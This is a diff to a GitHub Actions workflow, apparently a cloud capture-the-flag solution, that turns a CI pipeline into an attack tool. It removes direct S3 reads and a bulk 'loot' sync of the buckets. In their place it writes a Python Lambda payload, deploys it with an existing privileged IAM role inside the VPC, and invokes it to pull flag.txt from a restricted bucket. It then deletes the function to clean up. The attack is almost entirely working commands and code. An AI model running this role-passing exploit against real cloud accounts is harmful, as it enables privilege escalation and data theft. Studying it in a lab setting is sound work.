@@ -17,19 +17,36 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: List Resources
+      - name: Exploit via Lambda Creation
         run: |
-          echo "=== Trying to read flag from all buckets ==="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - || true
-          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || true
-          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || true
+          echo "=== Creating Malicious Lambda Payload ==="
+          cat << 'INNER_EOF' > exploit.py
+          import boto3
+          def lambda_handler(event, context):
+              s3 = boto3.client('s3')
+              try:
+                  # ניסיון לקרוא מהבאקט המאובטח
+                  flag = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().decode('utf-8')
+                  return {"flag": flag}
+              except Exception as e:
+                  return {"error": str(e)}
+          INNER_EOF
           
-          echo "=== Backing up buckets to find the flag file ==="
-          mkdir loot_dir
-          aws s3 sync s3://platform-bucket-009661764077-us-east-1/ ./loot_dir/ || true
-          aws s3 sync s3://codec4f26c862a321ef5/ ./loot_dir/ || true
-          aws s3 sync s3://site781fe43f26b9eba3/ ./loot_dir/ || true
+          zip -r exploit.zip exploit.py
           
-          echo "=== Contents of local loot directory ==="
-          ls -la ./loot_dir || true
-          cat ./loot_dir/flag.txt || true
+          echo "=== Deploying Exploit Lambda ==="
+          # יצירת הפונקציה תוך שימוש ב-Role של ה-Lambda הקיימת שמוגדר בתוך ה-VPC
+          aws lambda create-function \
+            --function-name ctf-exploit-lambda \
+            --runtime python3.12 \
+            --role arn:aws:iam::009661764077:role/lambdaRole \
+            --handler exploit.lambda_handler \
+            --zip-file fileb://exploit.zip \
+            --vpc-config SubnetIds=subnet-0d86c3129f4405706,SecurityGroupIds=sg-0de9d1a2c42a08a3e || true
+            
+          echo "=== Invoking Exploit Lambda ==="
+          aws lambda invoke --function-name ctf-exploit-lambda --cli-binary-format raw-in-base64-out response.json || true
+          cat response.json || true
+          
+          echo "=== Cleaning Up ==="
+          aws lambda delete-function --function-name ctf-exploit-lambda || true
